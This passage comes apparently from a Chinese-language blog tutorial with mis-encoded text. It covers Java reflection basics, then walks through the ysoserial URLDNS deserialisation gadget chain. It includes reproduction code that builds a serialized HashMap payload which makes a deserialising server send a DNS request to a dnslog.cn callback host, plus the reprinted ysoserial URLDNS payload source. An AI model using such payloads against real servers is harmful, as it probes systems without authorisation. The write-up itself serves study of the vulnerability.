<li>å·²çŸ¥ä¸€ä¸ª<strong>ç±»çš„å…¨ç±»å</strong>ï¼Œä¸”è¯¥ç±»åœ¨ç±»è·¯å¾„ä¸‹ï¼Œå¯é€šè¿‡ Class ç±»çš„<strong>é™æ€æ–¹æ³• forName()</strong> è·å–ï¼Œå¯èƒ½æŠ›å‡º ClassNotFoundException</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;demo01.Student&quot;</span>);<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-comment">//æµ‹è¯• class ç±»çš„åˆ›å»ºæ–¹å¼æœ‰å“ªäº›</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(<span class="hljs-string">&quot;è¿™ä¸ªäººæ˜¯ï¼š&quot;</span>+person.name);<br><br>        <span class="hljs-comment">//æ–¹å¼ä¸€ï¼šé€šè¿‡å¯¹è±¡è·å¾—</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> person.getClass();<br>        System.out.println(c1.hashCode());<br><br>        <span class="hljs-comment">//æ–¹å¼äºŒï¼šfoename è·å¾—</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Student&quot;</span>);<br>        System.out.println(c2.hashCode());<br><br>        <span class="hljs-comment">//æ–¹å¼ä¸‰ï¼šé€šè¿‡ç±»å .class è·å¾—</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> Student.class;<br>        System.out.println(c3.hashCode());<br><br>        <span class="hljs-comment">//æ–¹å¼å››ï¼šåŸºæœ¬å†…ç½®ç±»å‹çš„åŒ…è£…ç±»éƒ½æœ‰ä¸€ä¸ª Type å±æ€§</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> Integer.TYPE;<br>        System.out.println(c4);<br><br>        <span class="hljs-comment">//è·å¾—çˆ¶ç±»ç±»å‹</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c5</span> <span class="hljs-operator">=</span> c1.getSuperclass();<br>        System.out.println(c5);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;student&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Teacher</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Teacher&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="2-2-3-å®ä¾‹åŒ–-åˆ›å»ºå¯¹è±¡"><a href="#2-2-3-å®ä¾‹åŒ–-åˆ›å»ºå¯¹è±¡" class="headerlink" title="2.2.3 å®ä¾‹åŒ–&#x2F;åˆ›å»ºå¯¹è±¡"></a>2.2.3 å®ä¾‹åŒ–&#x2F;åˆ›å»ºå¯¹è±¡</h3><blockquote>
<p>å› ä¸º Class ç±»æ˜¯ <code>private</code> ç§æœ‰å±æ€§ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•é€šè¿‡åˆ›å»ºå¯¹è±¡çš„æ–¹å¼æ¥è·å– class å¯¹è±¡</p>
</blockquote>
<ul>
<li>é€šè¿‡ Class çš„ **newInstance() **æ–¹æ³•</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//newInstance ä¸èƒ½ä¼ å‚</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> (Person) c.newInstance();<br>System.out.println(p1);<br></code></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡ Constructor çš„ newInstance() æ–¹æ³•</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// getConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;asd&quot;</span>, <span class="hljs-number">11</span>);<br>System.out.println(p2);<br></code></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755212.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="2-2-3-è·å–ç±»é‡Œé¢çš„å±æ€§-Filed"><a href="#2-2-3-è·å–ç±»é‡Œé¢çš„å±æ€§-Filed" class="headerlink" title="2.2.3 è·å–ç±»é‡Œé¢çš„å±æ€§ Filed"></a>2.2.3 è·å–ç±»é‡Œé¢çš„å±æ€§ Filed</h3><ul>
<li>getField(<font style="color:#080808;background-color:#ffffff;">String name</font>)ï¼šæŒ‡å®šå˜é‡åï¼Œå¯è·å¾— public ç±»å‹çš„å±æ€§</li>
<li>getFields()ï¼šè·å¾—ç±»çš„ public ç±»å‹çš„å±æ€§</li>
<li>getDeclaredField(<font style="color:#080808;background-color:#ffffff;">String name</font>)ï¼šæŒ‡å®šå˜é‡åï¼Œå¯è·å¾—æ‰€æœ‰ç±»å‹çš„å±æ€§</li>
<li>getDeclaredFields()ï¼šè·å¾—ç±»çš„æ‰€æœ‰ç±»å‹çš„å±æ€§</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è·å–ç±»é‡Œé¢çš„å±æ€§</span><br>Field[] personfields1 = c.getFields();<br><span class="hljs-keyword">for</span> (Field field : personfields1) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br>Field[] personfields2 = c.getDeclaredFields();<br><span class="hljs-keyword">for</span> (Field field : personfields2) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">idfield</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;id&quot;</span>);<br>System.out.println(idfield);<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">allfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(allfield);<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755559.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="2-2-4-è·å–ç±»çš„æ–¹æ³•-Method"><a href="#2-2-4-è·å–ç±»çš„æ–¹æ³•-Method" class="headerlink" title="2.2.4 è·å–ç±»çš„æ–¹æ³• Method"></a>2.2.4 è·å–ç±»çš„æ–¹æ³• Method</h3><ul>
<li>getMethod(String name, Class&lt;?&gt;â€¦ parameterTypes)ï¼šæŒ‡å®šæ–¹æ³•åå’Œå‚æ•°ç±»å‹ï¼Œå¯è·å¾— public æ–¹æ³•ï¼ˆåŒ…å«çˆ¶ç±»ç»§æ‰¿çš„ï¼‰ã€‚</li>
<li>getMethods()ï¼šè·å¾—ç±»åŠçˆ¶ç±»çš„æ‰€æœ‰ public æ–¹æ³•ã€‚</li>
<li>getDeclaredMethod(String name, Class&lt;?&gt;â€¦ parameterTypes)ï¼šæŒ‡å®šæ–¹æ³•åå’Œå‚æ•°ç±»å‹ï¼Œå¯è·å¾—æœ¬ç±»å£°æ˜çš„ä»»æ„æ–¹æ³•ï¼ˆåŒ…æ‹¬ privateã€protectedã€é»˜è®¤ã€publicï¼‰ã€‚</li>
<li>getDeclaredMethods()ï¼šè·å¾—ç±»ä¸­å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼ˆä¸å«çˆ¶ç±»ï¼‰ã€‚</li>
</ul>
<h3 id="2-2-5-è·å–ç±»çš„æ„é€ å™¨-Constructor"><a href="#2-2-5-è·å–ç±»çš„æ„é€ å™¨-Constructor" class="headerlink" title="2.2.5 è·å–ç±»çš„æ„é€ å™¨ Constructor"></a>2.2.5 è·å–ç±»çš„æ„é€ å™¨ Constructor</h3><ul>
<li>getConstructor(Class&lt;?&gt;â€¦ parameterTypes)ï¼šæŒ‡å®šå‚æ•°ç±»å‹ï¼Œå¯è·å¾— public æ„é€ å™¨ã€‚</li>
<li>getConstructors()ï¼šè·å¾—ç±»çš„æ‰€æœ‰ public æ„é€ å™¨ã€‚</li>
<li>getDeclaredConstructor(Class&lt;?&gt;â€¦ parameterTypes)ï¼šæŒ‡å®šå‚æ•°ç±»å‹ï¼Œå¯è·å¾—ç±»çš„ä»»æ„æ„é€ å™¨ï¼ˆåŒ…æ‹¬ privateï¼‰ã€‚</li>
<li>getDeclaredConstructors()ï¼šè·å¾—ç±»çš„æ‰€æœ‰æ„é€ å™¨ï¼ˆä¸è®ºä¿®é¥°ç¬¦ï¼‰ã€‚</li>
</ul>
<h2 id="2-3-URLDNS-é“¾"><a href="#2-3-URLDNS-é“¾" class="headerlink" title="2.3 URLDNS é“¾"></a>2.3 URLDNS é“¾</h2><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
<p>URLDNS æ˜¯  ysoserial ä¸­çš„ä¸€ä¸ªåˆ©ç”¨é“¾ï¼š</p>
<ul>
<li><p>Gadget Chain:</p>
</li>
<li><pre><code class="hljs">HashMap.readObject()
</code></pre>
</li>
<li><pre><code class="hljs">  HashMap.putVal()
</code></pre>
</li>
<li><pre><code class="hljs">    HashMap.hash()
</code></pre>
</li>
<li><pre><code class="hljs">      URL.hashCode()
</code></pre>
</li>
</ul>
<h3 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h3><p>é¦–å…ˆæ˜¯å› ä¸º HashMapï¼ˆjava&#x2F;util&#x2F;HashMap.javaï¼‰ ä¸­é‡å†™äº† readObject() æ–¹æ³•ï¼ŒHashMap.readObject() é€šè¿‡ <font style="color:#080808;background-color:#ffffff;">K key &#x3D; (K) s.readObject(); è¿›è¡Œååºåˆ—åŒ–ï¼Œä¹‹åè°ƒç”¨  putVal() -&gt; hash()ï¼Œåœ¨ hash() ä¸­è°ƒç”¨äº† hashCode() ï¼›ã€å…³äº HashMap çš„åˆ†æï¼š</font><a href="#KmszU">HashMap æ‰¾å…¥å£ç±»åˆ†æ</a><font style="color:#080808;background-color:#ffffff;">ã€‘</font></p>
<p><font style="color:#080808;background-color:#ffffff;">æ¥ä¸‹æ¥æŸ¥çœ‹ URLï¼ˆjava&#x2F;net&#x2F;URL.javaï¼‰ï¼ŒURL ä¸­ç»§æ‰¿äº† </font><strong><font style="color:#080808;background-color:#ffffff;">Serializableï¼Œ</font></strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755415.png" srcset="/img/loading.gif" lazyload></p>
<p>è·Ÿè¿› hashCode</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755653.png" srcset="/img/loading.gif" lazyload></p>
<p><code>getHostAddress(u)</code> ä¼šå°è¯•æŠŠ URL ä¸­çš„ä¸»æœºåè§£ææˆä¸€ä¸ª <code>InetAddress</code> å¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯ IP åœ°å€ï¼‰ï¼Œ å¦‚æœä¸»æœºåè§£ææˆåŠŸï¼ˆ<code>addr</code> ä¸ä¸º nullï¼‰ï¼Œå°±æŠŠè§£æå‡ºæ¥çš„ IP åœ°å€çš„ <code>hashCode()</code> åŠ å…¥åˆ° <code>h</code>ï¼ˆæ•´ä¸ª URL çš„å“ˆå¸Œå€¼ï¼‰é‡Œ  ï¼› å¦‚æœ DNS æ²¡è§£ææˆåŠŸï¼ˆ<code>addr == null</code>ï¼‰ï¼Œé‚£å°±ç›´æ¥å– URL åŸå§‹çš„ <code>host</code> å­—ç¬¦ä¸²  </p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755421.png" srcset="/img/loading.gif" lazyload></p>
<p>è·Ÿè¿› getHostAddressï¼Œ<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName(host)æ–¹æ³•ä¼šå»è§£æä¸»æœºåï¼Œ</font></p>
<ul>
<li>å¦‚æœ <code>host</code> æ˜¯ IP åœ°å€ï¼Œç›´æ¥è½¬æ¢æˆ <code>InetAddress</code>ï¼Œä¸ä¼šèµ° DNS</li>
<li>å¦‚æœ <code>host</code> æ˜¯åŸŸåï¼Œè¿™é‡Œå°±ä¼šå‘ç³»ç»Ÿçš„ <strong>DNS è§£æå™¨</strong> å‘èµ·è¯·æ±‚ï¼Œè§£ææˆ IP</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756610.png" srcset="/img/loading.gif" lazyload></p>
<hr>
<hr>
<p><strong>å®Œæ•´çš„åˆ©ç”¨é“¾ï¼š</strong></p>
<p> HashMap.readObject()</p>
<p>-&gt; HashMap.putVal()</p>
<p>-&gt; HashMap.hash()</p>
<p>-&gt; URL.hashCode()</p>
<p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode()</font></p>
<p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode.</font>getHostAddress()</p>
<p>-&gt; getHostAddress.<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName()  ã€è¿™é‡Œå‘å‡º DNS è¯·æ±‚ã€‘</font></p>
<h3 id="å¤ç°ï¼š"><a href="#å¤ç°ï¼š" class="headerlink" title="å¤ç°ï¼š"></a>å¤ç°ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://9zuzrq.dnslog.cn&quot;</span>),<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆæ‰§è¡Œåºåˆ—åŒ–ï¼Œå‘ç°è§¦å‘äº†dns è¯·æ±‚ï¼Ÿ</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756014.png" srcset="/img/loading.gif" lazyload></p>
<p>å›åˆ°æºç ä¸­ï¼šå½“ hashCode ä¸ä¸º -1 æ—¶ï¼Œç›´æ¥è¿”å› hashCodeï¼Œä¸å†æ‰§è¡Œä¸‹é¢ä»£ç </p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756302.png" srcset="/img/loading.gif" lazyload></p>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œç¬¬ä¸€æ¬¡å°† keyï¼ˆä¹Ÿå°±æ˜¯ dnslogï¼‰ä¼ å…¥ URL.hashCode æ—¶ï¼ŒhashCode &#x3D;&#x3D; -1ï¼ˆ-1 è¡¨ç¤ºæ²¡æœ‰è®¡ç®—è¿‡ï¼‰ï¼Œæ‰§è¡Œ hashCode &#x3D; handler.hashCode(this); ï¼Œè€Œæ ¹æ®ä¹‹å‰çš„åˆ†æï¼Œ  handler.hashCode  -&gt; getHostAddress -&gt; InetAddress.getByName(host) -&gt; å‘èµ·dnsè¯·æ±‚ï¼Œæ‰€ä»¥è¯´ï¼Œåºåˆ—åŒ–æœ¬èº«æ²¡æœ‰å‘èµ· dnsè¯·æ±‚ï¼Œæ˜¯å› ä¸º HashMap åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨äº† URL.hashCode() ï¼ŒURL.hashCode() è§£æä¸»æœºåå‘èµ· DNS è¯·æ±‚ã€‚</p>
<p>é‚£ä¹ˆå¦‚ä½•ä¸åœ¨ç¬¬ä¸€æ¬¡å‘èµ·è¯·æ±‚ï¼Ÿ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br><span class="hljs-comment">//è¿™é‡Œä¸ä½¿ç”¨ put</span><br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://yjgubh.dnslog.cn&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//äººä¸ºä¿®æ”¹ URL.hashCode ç¼“å­˜å€¼ï¼Œ</span><br>hashcodefield.set(url,<span class="hljs-number">12134</span>);<br><span class="hljs-comment">//ç”±äº hashCode != -1ï¼Œå®ƒç›´æ¥è¿”å› 12134ï¼Œä¸ä¼šè§¦å‘ DNSï¼Œåªæ˜¯æŠŠ URL å½“ key å­˜è¿›å»</span><br><span class="hljs-comment">//å­˜è¿›å»ä¹‹åï¼šæ­¤æ—¶ HashMap å†…éƒ¨åªè®°å½•ï¼škey = URL(&quot;http://xx.dnslog.cn&quot;);key çš„ hash å€¼ = 12134;value = 1</span><br>hashmap.put(url,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//ååºåˆ—åŒ–ä¹‹å‰æŠŠ hashcode æ”¹å› -1,æ¢å¤ URL.hashCode çš„é»˜è®¤çŠ¶æ€,ä¸‹ä¸€æ¬¡è°ƒç”¨ url.hashCode() æ—¶ï¼Œä¼šé‡æ–°è®¡ç®—å¹¶è§¦å‘ DNS è§£æ</span><br>hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–çš„è¿‡ç¨‹å°±ä¸ä¼š DNS è§£æï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756901.png" srcset="/img/loading.gif" lazyload></p>
<p>åªæœ‰ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ DNS è§£æï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757978.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="å­¦ä¹ -ysoserial-ä¸­çš„-URLDNSï¼š"><a href="#å­¦ä¹ -ysoserial-ä¸­çš„-URLDNSï¼š" class="headerlink" title="å­¦ä¹  ysoserial ä¸­çš„ URLDNSï¼š"></a>å­¦ä¹  ysoserial ä¸­çš„ URLDNSï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="hljs-meta">@PayloadTest(skip = &quot;true&quot;)</span><br><span class="hljs-meta">@Dependencies()</span><br><span class="hljs-meta">@Authors(&#123; Authors.GEBL &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//é¿å…æå‰è§£æ</span><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-comment">//åˆ›å»º HashMap + URL</span><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                <span class="hljs-comment">//é‡ç½® URL çš„ç¼“å­˜ hashCode</span><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



